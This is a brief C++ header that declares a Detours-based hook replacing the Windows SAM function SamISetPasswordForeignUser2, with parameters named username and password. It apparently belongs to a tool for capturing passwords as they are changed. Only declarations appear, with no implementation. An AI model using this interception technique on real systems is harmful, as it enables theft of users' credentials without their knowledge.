#pragma once
#pragma comment(lib, "detours.lib")
#include <fstream>
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers

BOOL AttachHook();
BOOL DetachHook();

typedef DWORD NET_API_STATUS;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef NET_API_STATUS(WINAPI* pSamISetPasswordForeignUser2)(LPVOID, UINT, LPVOID, LPVOID, LPVOID, LPVOID, LPVOID);
extern pSamISetPasswordForeignUser2 SamISetPasswordForeignUser2;

NET_API_STATUS HookSamISetPasswordForeignUser2(LPVOID param1, UINT param2, LPVOID username, LPVOID password, LPVOID param5, LPVOID param6, LPVOID param7);